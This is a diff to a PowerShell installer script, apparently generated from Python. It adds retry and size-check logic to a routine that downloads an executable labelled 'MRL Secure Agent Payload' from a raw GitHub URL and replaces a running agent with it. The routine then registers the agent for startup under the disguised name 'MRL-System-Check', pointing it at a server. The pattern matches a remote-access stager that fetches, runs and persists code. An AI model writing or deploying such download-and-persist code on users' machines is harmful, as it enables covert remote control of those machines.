@@ -138,16 +138,30 @@ if (!(Test-Path $dir)) {{ New-Item -ItemType Directory -Path $dir -Force | Out-N
 $client_path = "$dir\\mrl_agent.exe"
 $tmp_path = "$env:TEMP\\mrl_agent_new.exe"
 
-# Step 1: Download to TEMP first (old agent still running - no lock conflict)
+# Step 1: Download with high timeout and retry logic
 $url = "https://raw.githubusercontent.com/umonkt-dotcom/umonkt/main/mrl_agent.exe"
-Write-Host "Downloading MRL Secure Agent Payload... Please Wait" -ForegroundColor Cyan
+Write-Host "Downloading MRL Secure Agent Payload (93MB)..." -ForegroundColor Cyan
 if (Test-Path $tmp_path) {{ Remove-Item $tmp_path -Force -ErrorAction SilentlyContinue }}
-Invoke-WebRequest -Uri $url -OutFile $tmp_path -TimeoutSec 300
 
-# Verify download is complete (must be at least 10MB)
-$size = (Get-Item $tmp_path).Length
-if ($size -lt 10MB) {{
-    Write-Host "Download incomplete ($size bytes). Please try again." -ForegroundColor Red; exit 1
+try {{
+    Invoke-WebRequest -Uri $url -OutFile $tmp_path -TimeoutSec 600 -ErrorAction Stop
+}} catch {{
+    Write-Host "Download Failed: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "Checking if partial file exists..."
+}}
+
+# Verify download is complete (must be at least 90MB)
+if (Test-Path $tmp_path) {{
+    $size = (Get-Item $tmp_path).Length
+    if ($size -lt 90MB) {{
+        Write-Host "CRITICAL: Download incomplete ($($size / 1MB) MB). Connection timed out." -ForegroundColor Red
+        Write-Host "Retrying in 5 seconds..."
+        Start-Sleep -Seconds 5
+        Invoke-WebRequest -Uri $url -OutFile $tmp_path -TimeoutSec 900 -ErrorAction Stop
+    }}
+}} else {{
+    Write-Host "CRITICAL: Download failed entirely. Please check your internet connection." -ForegroundColor Red
+    exit 1
 }}
 
 # Step 2: Now kill old agent and wait for it to fully exit
@@ -158,13 +172,17 @@ while ((Get-Process -Name mrl_agent -ErrorAction SilentlyContinue) -and (Get-Dat
 }}
 
 # Step 3: Replace old exe with the newly downloaded one
+Write-Host "Installing updates..." -ForegroundColor Yellow
 for ($i = 0; $i -lt 15; $i++) {{
     try {{
         if (Test-Path $client_path) {{ Remove-Item $client_path -Force -ErrorAction Stop }}
         Move-Item $tmp_path $client_path -Force -ErrorAction Stop
+        $success = $true
         break
     }} catch {{ Start-Sleep -Seconds 1 }}
 }}
+
+if (!$success) {{ Write-Host "Installation failed (File locked). Please restart the PC." -ForegroundColor Red; exit 1 }}
 
 $reg_key = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 Set-ItemProperty -Path $reg_key -Name "MRL-System-Check" -Value "`"$client_path`" --server {host.split(':')[0]}"
